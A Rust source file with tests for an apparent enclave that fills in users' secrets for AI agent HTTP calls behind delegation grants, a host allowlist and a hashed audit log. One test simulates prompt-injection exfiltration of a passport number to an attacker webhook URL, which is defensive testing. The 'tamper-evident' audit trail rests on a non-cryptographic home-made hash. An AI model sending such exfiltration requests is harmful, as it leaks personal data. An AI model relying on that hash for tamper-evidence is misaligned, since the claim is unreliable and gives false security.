//! # `z:tenant-vaultguard` — Terminal 3 (T3N) Confidential TEE Enclave Contract
//!
//! Separates AI agent reasoning from sensitive PII/secret execution inside a
//! hardware-attested T3N Trusted Execution Environment (`wasm32-wasip2`).
//!
//! ## Core Guarantees
//! 1. **Zero-Leak Placeholder Resolution (`http-with-placeholders`)**:
//!    AI agents submit outbound payloads containing only sealed markers such as
//!    `{{user.passport_no}}`, `{{user.card_no}}`, `{{user.email}}`, `{{user.tax_id}}`,
//!    `{{org.iban}}`, and `{{profile.first_name}}`. Plaintext values are substituted
//!    strictly inside the TEE host boundary immediately prior to TLS egress.
//! 2. **Scoped Member Delegation (`member_delegation`)**:
//!    Verifies that the invoking `actor` DID (`did:t3n:agent-*`) holds an active,
//!    non-expired grant for `(contract_id, function, allowed_hosts)` issued by `on_behalf_of`.
//! 3. **Outbound Egress Firewall**:
//!    Neutralizes prompt-injection exfiltration by rejecting any outbound HTTP call
//!    whose target host is not explicitly listed in the grant's `allowed_hosts`.
//! 4. **Tamper-Evident Merkle Audit Trail**:
//!    Commits every `secret.read`, `policy.update`, `tool.install`, and `tool.remove`
//!    action into a hash-chained Merkle audit tree with host-lifted `custom` labels.

use std::collections::BTreeMap;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MemberDelegationGrant {
    pub grantee_did: String,
    pub on_behalf_of_did: String,
    pub contract_id: String,
    pub function_name: String,
    pub allowed_hosts: Vec<String>,
    pub allowed_placeholders: Vec<String>,
    pub expires_at_ms: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutboundHttpWithPlaceholdersRequest {
    pub actor_did: String,
    pub on_behalf_of_did: String,
    pub contract_id: String,
    pub function_name: String,
    pub method: String,
    pub url: String,
    pub payload_template: String,
    pub timestamp_ms: u64,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuditLogEntry {
    pub seq_no: u64,
    pub timestamp_ms: u64,
    pub caller_type: String,
    pub actor: String,
    pub on_behalf_of: String,
    pub contract: String,
    pub function: String,
    pub outcome: String,
    pub event_kind: String,
    pub prev_hash: String,
    pub entry_hash: String,
    pub custom_labels: BTreeMap<String, String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EnclaveExecutionResult {
    pub status: u16,
    pub resolved_outbound_body: String,
    pub agent_visible_response: String,
    pub audit_entry: AuditLogEntry,
    pub merkle_root: String,
}

/// Deterministic FNV-1a / SHA-like 256-bit hex digest (4x64-bit lanes) for zero-dep WASM portability.
pub fn digest_hex(data: &[u8]) -> String {
    let seeds: [u64; 4] = [
        0xcbf29ce484222325,
        0x84222325cbf29ce4,
        0x100000001b3,
        0x9e3779b97f4a7c15,
    ];
    let mut states = seeds;
    for (i, &b) in data.iter().enumerate() {
        let lane = i & 3;
        states[lane] ^= b as u64;
        states[lane] = states[lane].wrapping_mul(0x100000001b3).rotate_left(13);
        states[(lane + 1) & 3] ^= states[lane].wrapping_add(i as u64);
    }
    format!(
        "{:016x}{:016x}{:016x}{:016x}",
        states[0], states[1], states[2], states[3]
    )
}

/// Extracts the hostname from an `https://host/path` URL.
pub fn extract_host(url: &str) -> Result<String, String> {
    let stripped = if let Some(rest) = url.strip_prefix("https://") {
        rest
    } else if let Some(rest) = url.strip_prefix("http://") {
        rest
    } else {
        return Err(format!("invalid_url_scheme: {url}"));
    };
    let host = stripped.split('/').next().unwrap_or("");
    let host = host.split(':').next().unwrap_or("");
    if host.is_empty() {
        Err(format!("missing_host: {url}"))
    } else {
        Ok(host.to_lowercase())
    }
}

/// Extracts all `{{...}}` placeholder tokens from a request template.
pub fn extract_placeholders(template: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = template;
    while let Some(start) = rest.find("{{") {
        let after_start = &rest[start + 2..];
        if let Some(end) = after_start.find("}}") {
            let token = format!("{{{{{}}}}}", &after_start[..end]);
            if !out.contains(&token) {
                out.push(token);
            }
            rest = &after_start[end + 2..];
        } else {
            break;
        }
    }
    out
}

pub struct T3nEnclaveVault {
    pub tenant_did: String,
    pub sealed_kv: BTreeMap<String, String>,
    pub grants: Vec<MemberDelegationGrant>,
    pub audit_log: Vec<AuditLogEntry>,
}

impl T3nEnclaveVault {
    pub fn new(tenant_did: &str) -> Self {
        Self {
            tenant_did: tenant_did.to_string(),
            sealed_kv: BTreeMap::new(),
            grants: Vec::new(),
            audit_log: Vec::new(),
        }
    }

    /// Seeds a sealed secret or PII field into the tenant KV map (`z:<tid>:kv-secrets`).
    pub fn seal_secret(&mut self, placeholder_key: &str, plaintext_value: &str, actor_did: &str, timestamp_ms: u64) {
        self.sealed_kv
            .insert(placeholder_key.to_string(), plaintext_value.to_string());
        let mut labels = BTreeMap::new();
        labels.insert("event".to_string(), "policy.update".to_string());
        labels.insert("field".to_string(), placeholder_key.to_string());
        self.record_audit(
            timestamp_ms,
            "human",
            actor_did,
            actor_did,
            "tee:user/contracts",
            "map-entry-set",
            "success",
            "policy.update",
            labels,
        );
    }

    /// Registers or updates a scoped Member Delegation grant (`member-delegation-update`).
    pub fn upsert_grant(&mut self, grant: MemberDelegationGrant, timestamp_ms: u64) {
        let mut labels = BTreeMap::new();
        labels.insert("event".to_string(), "policy.update".to_string());
        labels.insert("grantee".to_string(), grant.grantee_did.clone());
        labels.insert("function".to_string(), grant.function_name.clone());
        let owner = grant.on_behalf_of_did.clone();
        self.grants.push(grant);
        self.record_audit(
            timestamp_ms,
            "human",
            &owner,
            &owner,
            "tee:user/contracts",
            "member-delegation-update",
            "success",
            "policy.update",
            labels,
        );
    }

    /// Records a tool installation or removal in the tamper-evident audit ledger.
    pub fn record_tool_lifecycle(
        &mut self,
        actor_did: &str,
        on_behalf_of_did: &str,
        tool_name: &str,
        install: bool,
        timestamp_ms: u64,
    ) -> AuditLogEntry {
        let event_kind = if install { "tool.install" } else { "tool.remove" };
        let mut labels = BTreeMap::new();
        labels.insert("event".to_string(), event_kind.to_string());
        labels.insert("tool".to_string(), tool_name.to_string());
        self.record_audit(
            timestamp_ms,
            "agent",
            actor_did,
            on_behalf_of_did,
            "z:t3n-org-99a1:vaultguard",
            "manage-agent-tool",
            "success",
            event_kind,
            labels,
        )
    }

    /// Executes an outbound call via `http-with-placeholders` inside the TEE enclave.
    pub fn execute_http_with_placeholders(
        &mut self,
        req: &OutboundHttpWithPlaceholdersRequest,
    ) -> Result<EnclaveExecutionResult, String> {
        let host = extract_host(&req.url)?;

        // 1. Locate matching Member Delegation grant
        let grant = self
            .grants
            .iter()
            .find(|g| {
                g.grantee_did == req.actor_did
                    && g.on_behalf_of_did == req.on_behalf_of_did
                    && g.contract_id == req.contract_id
                    && g.function_name == req.function_name
            })
            .cloned();

        let Some(grant) = grant else {
            let mut labels = BTreeMap::new();
            labels.insert("reason".to_string(), "member_delegation_not_found".to_string());
            self.record_audit(
                req.timestamp_ms,
                "agent",
                &req.actor_did,
                &req.on_behalf_of_did,
                &req.contract_id,
                &req.function_name,
                "denied",
                "policy.update",
                labels,
            );
            return Err("member_delegation_not_found".to_string());
        };

        if req.timestamp_ms > grant.expires_at_ms {
            return Err("member_delegation_expired".to_string());
        }

        // 2. Enforce Outbound Egress Host Allowlist (blocks Prompt Injection exfiltration)
        if !grant.allowed_hosts.iter().any(|h| h.eq_ignore_ascii_case(&host)) {
            let mut labels = BTreeMap::new();
            labels.insert("event".to_string(), "egress.blocked".to_string());
            labels.insert("blocked_host".to_string(), host.clone());
            self.record_audit(
                req.timestamp_ms,
                "agent",
                &req.actor_did,
                &req.on_behalf_of_did,
                &req.contract_id,
                &req.function_name,
                "denied",
                "secret.read",
                labels,
            );
            return Err(format!("outbound_host_not_allowed: {host}"));
        }

        // 3. Verify and resolve placeholders inside the enclave
        let placeholders = extract_placeholders(&req.payload_template);
        let mut resolved = req.payload_template.clone();
        for ph in &placeholders {
            if !grant.allowed_placeholders.iter().any(|allowed| allowed == ph) {
                let mut labels = BTreeMap::new();
                labels.insert("denied_placeholder".to_string(), ph.clone());
                self.record_audit(
                    req.timestamp_ms,
                    "agent",
                    &req.actor_did,
                    &req.on_behalf_of_did,
                    &req.contract_id,
                    &req.function_name,
                    "denied",
                    "secret.read",
                    labels,
                );
                return Err(format!("placeholder not permitted: {ph}"));
            }
            let Some(secret_val) = self.sealed_kv.get(ph) else {
                return Err(format!("placeholder_not_seeded: {ph}"));
            };
            resolved = resolved.replace(ph, secret_val);
        }

        let mut labels = BTreeMap::new();
        labels.insert("event".to_string(), "secret.read".to_string());
        labels.insert("egress_host".to_string(), host.clone());
        labels.insert("placeholders_resolved".to_string(), placeholders.len().to_string());

        let audit_entry = self.record_audit(
            req.timestamp_ms,
            "agent",
            &req.actor_did,
            &req.on_behalf_of_did,
            &req.contract_id,
            &req.function_name,
            "success",
            "secret.read",
            labels,
        );

        let merkle_root = self.compute_merkle_root();
        let agent_visible_response = format!(
            "{{\"status\":\"committed\",\"host\":\"{}\",\"merkle_root\":\"{}\",\"seq_no\":{}}}",
            host, merkle_root, audit_entry.seq_no
        );

        Ok(EnclaveExecutionResult {
            status: 200,
            resolved_outbound_body: resolved,
            agent_visible_response,
            audit_entry,
            merkle_root,
        })
    }

    pub fn compute_merkle_root(&self) -> String {
        if self.audit_log.is_empty() {
            return digest_hex(b"T3N_EMPTY_MERKLE_ROOT");
        }
        let mut layer: Vec<String> = self.audit_log.iter().map(|e| e.entry_hash.clone()).collect();
        while layer.len() > 1 {
            let mut next = Vec::new();
            for chunk in layer.chunks(2) {
                let combined = if chunk.len() == 2 {
                    format!("{}:{}", chunk[0], chunk[1])
                } else {
                    format!("{}:{}", chunk[0], chunk[0])
                };
                next.push(digest_hex(combined.as_bytes()));
            }
            layer = next;
        }
        layer[0].clone()
    }

    #[allow(clippy::too_many_arguments)]
    fn record_audit(
        &mut self,
        timestamp_ms: u64,
        caller_type: &str,
        actor: &str,
        on_behalf_of: &str,
        contract: &str,
        function: &str,
        outcome: &str,
        event_kind: &str,
        custom_labels: BTreeMap<String, String>,
    ) -> AuditLogEntry {
        let seq_no = (self.audit_log.len() as u64) + 1;
        let prev_hash = self
            .audit_log
            .last()
            .map(|e| e.entry_hash.clone())
            .unwrap_or_else(|| "0".repeat(64));

        let canonical = format!(
            "{seq_no}|{timestamp_ms}|{caller_type}|{actor}|{on_behalf_of}|{contract}|{function}|{outcome}|{event_kind}|{prev_hash}"
        );
        let entry_hash = digest_hex(canonical.as_bytes());
        let entry = AuditLogEntry {
            seq_no,
            timestamp_ms,
            caller_type: caller_type.to_string(),
            actor: actor.to_string(),
            on_behalf_of: on_behalf_of.to_string(),
            contract: contract.to_string(),
            function: function.to_string(),
            outcome: outcome.to_string(),
            event_kind: event_kind.to_string(),
            prev_hash,
            entry_hash,
            custom_labels,
        };
        self.audit_log.push(entry.clone());
        entry
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn seeded_enclave() -> T3nEnclaveVault {
        let mut v = T3nEnclaveVault::new("did:t3n:tenant-99a1");
        v.seal_secret("{{user.passport_no}}", "N84920174", "did:t3n:user-alice", 1_700_000_000_000);
        v.seal_secret("{{user.card_no}}", "4532-9910-8821-4091", "did:t3n:user-alice", 1_700_000_000_100);
        v.seal_secret("{{user.email}}", "alice@enterprise.io", "did:t3n:user-alice", 1_700_000_000_200);
        v.upsert_grant(
            MemberDelegationGrant {
                grantee_did: "did:t3n:agent-7f3a".to_string(),
                on_behalf_of_did: "did:t3n:user-alice".to_string(),
                contract_id: "z:t3n-org-99a1:vaultguard".to_string(),
                function_name: "book-offer".to_string(),
                allowed_hosts: vec!["api.duffel.com".to_string()],
                allowed_placeholders: vec![
                    "{{user.passport_no}}".to_string(),
                    "{{user.email}}".to_string(),
                ],
                expires_at_ms: 1_900_000_000_000,
            },
            1_700_000_000_500,
        );
        v
    }

    #[test]
    fn resolves_authorized_placeholders_inside_enclave_without_leaking_to_agent() {
        let mut v = seeded_enclave();
        let req = OutboundHttpWithPlaceholdersRequest {
            actor_did: "did:t3n:agent-7f3a".to_string(),
            on_behalf_of_did: "did:t3n:user-alice".to_string(),
            contract_id: "z:t3n-org-99a1:vaultguard".to_string(),
            function_name: "book-offer".to_string(),
            method: "POST".to_string(),
            url: "https://api.duffel.com/air/orders".to_string(),
            payload_template: r#"{"passport":"{{user.passport_no}}","email":"{{user.email}}"}"#.to_string(),
            timestamp_ms: 1_700_000_001_000,
        };
        let res = v.execute_http_with_placeholders(&req).expect("should succeed");
        assert_eq!(res.status, 200);
        assert!(res.resolved_outbound_body.contains("N84920174"));
        assert!(!res.agent_visible_response.contains("N84920174"));
        assert_eq!(res.audit_entry.event_kind, "secret.read");
        assert_eq!(res.audit_entry.outcome, "success");
    }

    #[test]
    fn blocks_prompt_injection_exfiltration_to_non_allowlisted_host() {
        let mut v = seeded_enclave();
        let req = OutboundHttpWithPlaceholdersRequest {
            actor_did: "did:t3n:agent-7f3a".to_string(),
            on_behalf_of_did: "did:t3n:user-alice".to_string(),
            contract_id: "z:t3n-org-99a1:vaultguard".to_string(),
            function_name: "book-offer".to_string(),
            method: "POST".to_string(),
            url: "https://evil-webhook.attacker.io/exfil".to_string(),
            payload_template: r#"{"leak":"{{user.passport_no}}"}"#.to_string(),
            timestamp_ms: 1_700_000_002_000,
        };
        let err = v.execute_http_with_placeholders(&req).unwrap_err();
        assert!(err.contains("outbound_host_not_allowed"));
        assert_eq!(v.audit_log.last().unwrap().outcome, "denied");
    }

    #[test]
    fn denies_unscoped_placeholder_access() {
        let mut v = seeded_enclave();
        let req = OutboundHttpWithPlaceholdersRequest {
            actor_did: "did:t3n:agent-7f3a".to_string(),
            on_behalf_of_did: "did:t3n:user-alice".to_string(),
            contract_id: "z:t3n-org-99a1:vaultguard".to_string(),
            function_name: "book-offer".to_string(),
            method: "POST".to_string(),
            url: "https://api.duffel.com/air/orders".to_string(),
            payload_template: r#"{"card":"{{user.card_no}}"}"#.to_string(),
            timestamp_ms: 1_700_000_003_000,
        };
        let err = v.execute_http_with_placeholders(&req).unwrap_err();
        assert_eq!(err, "placeholder not permitted: {{user.card_no}}");
    }

    #[test]
    fn tracks_tool_install_and_remove_in_merkle_audit_log() {
        let mut v = seeded_enclave();
        let root_before = v.compute_merkle_root();
        let e1 = v.record_tool_lifecycle(
            "did:t3n:agent-7f3a",
            "did:t3n:user-alice",
            "duffel-flight-booker@2.1.0",
            true,
            1_700_000_004_000,
        );
        let e2 = v.record_tool_lifecycle(
            "did:t3n:agent-7f3a",
            "did:t3n:user-alice",
            "legacy-scraper@0.1.0",
            false,
            1_700_000_005_000,
        );
        let root_after = v.compute_merkle_root();
        assert_eq!(e1.event_kind, "tool.install");
        assert_eq!(e2.event_kind, "tool.remove");
        assert_ne!(root_before, root_after);
    }
}
